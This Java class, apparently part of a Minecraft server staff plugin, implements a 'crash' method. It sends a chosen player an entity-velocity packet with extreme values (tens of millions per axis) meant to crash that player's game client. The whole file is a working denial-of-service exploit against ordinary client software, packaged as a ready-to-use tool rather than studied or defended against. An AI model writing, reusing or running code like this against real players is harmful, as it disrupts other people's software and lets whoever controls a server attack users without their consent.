package dev.xnlawa.staffhelper.crash.impl;

import com.github.retrooper.packetevents.PacketEvents;
import com.github.retrooper.packetevents.util.Vector3d;
import com.github.retrooper.packetevents.wrapper.play.server.WrapperPlayServerEntityVelocity;
import dev.xnlawa.staffhelper.crash.Crash;
import dev.xnlawa.staffhelper.crash.CrashMethod;
import dev.xnlawa.staffhelper.packet.WrapperPlayServerEntityVelocityCrash;
import dev.xnlawa.staffhelper.util.RandomUtil;
import org.bukkit.entity.Player;

public class BadVelocityPacketCrash extends Crash {
    public BadVelocityPacketCrash() {
        super(CrashMethod.BADVELOCITYPACKET);
    }

    @Override
    public void performCrash(Player player) {
        Vector3d velocity = new Vector3d(
                99999999d * RandomUtil.nextDouble(0.2,0.4),
                99999999d * RandomUtil.nextDouble(0.2,0.4),
                99999999d * RandomUtil.nextDouble(0.2,0.4));
        WrapperPlayServerEntityVelocityCrash packet = new WrapperPlayServerEntityVelocityCrash(player.getEntityId(), velocity);
        PacketEvents.getAPI().getPlayerManager().sendPacket(player, packet);
    }
}
